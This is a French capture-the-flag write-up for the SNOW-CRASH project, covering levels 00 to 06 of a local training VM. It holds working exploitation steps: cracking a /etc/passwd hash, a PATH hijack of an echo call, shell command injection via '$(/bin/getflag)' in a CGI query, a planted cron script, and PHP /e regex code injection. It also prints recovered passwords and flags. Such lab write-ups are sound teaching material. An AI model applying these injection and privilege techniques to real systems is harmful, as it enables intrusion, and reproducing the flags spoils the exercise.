# SNOW-CRASH
## Capture the flags
***

### Concept 
Un project secu qui va nous faire naviger de niveau en niveau pour nous faire trouver les flags necessaire au passage de ceux-ci.
Pour ce project il est necessaire de telecharger un .iso dans lequel tu seras mis a l'epreuve.

## Level 00:
Tu devras trouver les fichiers accessible au user : ```flag00```  
Pour cela : ```find / -user flag00 2> /dev/null```   
Tu y trouvera le mot de passe crypte : ```cdiiddwpgswtgt```

Une fois decrypte ( https://cachesleuth.com/multidecoder/), 
cela donne  ```nottoohardhere```



## Level 01:
Tu dois faire :
```/etc/passwd```
cela retourne : 
```flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash```

Pour decoder le code : ```42hDRfypTqqnw```
Tu dois mettre ce code dans John the ripper (logiciel de decryptage) ce qui te donnera : ```abcdefg```

## Level 02:


Il y a un fichier level02.pcap

Ces fichiers sont a ouvrir avec wireshark, ici le fichier une fois ouvert on peut utiliser l'option ```FOLLOW--> TCP Stream``` et on obtient un mot de passe partiel : 
<img src="./srcs/img/wireshark_global_img.png">

si on regarde les transferts qui correspondent au ```.``` on peut voir que ca corresponds au transfere d'un packet de 1 byte : 7f 
<img src="./srcs/img/wireshark_global_img.png">

en ascii 7f correspond a DEL

le mot de passe est donc : 
```ft_waNDReL0L```

## Level 03:

On arrive directement sur un folder avec un executable ```level03```

avec ```ltrace``` on peut voir cette ligne : 
```system("/usr/bin/env echo Exploit me"Exploit me```
qui nous indique un appel systeme d'echo.
On va donc faire un echo exploit en creant un fichier ```echo``` dans lequel on va mettre le path de getflag.  
Avec ```export``` on va rajouter le chemin d'```echo``` a PATH (au debut) et relancer le binaire. 

Dans ```/tmp```  
 ```vim echo```
```echo
/bin/getflag
```
```chmod + x```
  ```export PATH=/tmp:$PATH```

puis ```./level03 ```     
:)

## Level  04:

On arrive sur un folder avec un fichier perl ```level04.pl```
  Apres ouverture on voit que ce fichier peut etre execute sur le port :    
```localhost:4747``` et que le programme va print le premiere argument donne a la variable x telque :   
 ```
 level04@SnowCrash:~$curl"http://localhost:4747/level04.pl?x=whoami"
 whoami   
 level04@SnowCrash:~$curl "http://localhost:4747/level04.pl?x=$(whoami)   
 level04
 ```

L'objectif est de contourner ca pour executer getflag dans /bin/getflag telque :   
```level04@SnowCrash:~$ curl  "http://localhost:4747/level04.pl?x=\$(/bin/getflag)"```

## Level05:

Ici pas de fichier.
Petit retour a ```find / -user flag05 2> /dev/null```    
 Ici un fichier qui nous indique que regulierement les scripts dans ```/opt/openarenaserver/```  puis les supprimes.   
 Donc on creer un petit script qui avec ```/bin/getflag > /tmp/reslut.txt``` (pour stocker le resultat de l'execution et on attend que l'ordinateur lance autoatiquement le script.) (viuaaale9huek52boumoomioc)

 ## Level06:

 Dans le code fournit dans level06.php on remarque  une expression reguliere qui utilise /e qui signifie all.   
 Cette expression est deprecated car on peut y faire des injections de code.   
 C'est ce qu'on va faire.  
 Pour cela on doit utiliser l'expression reguliere qui utilise /e  donc notre fichier doit contenir ```[x {commmand here}]```

```echo '[x {${`/bin/bash -c "/bin/getflag"`}}]' > /tmp/exploit.txt```

wiok45aaoguiboiki2tuin6ub
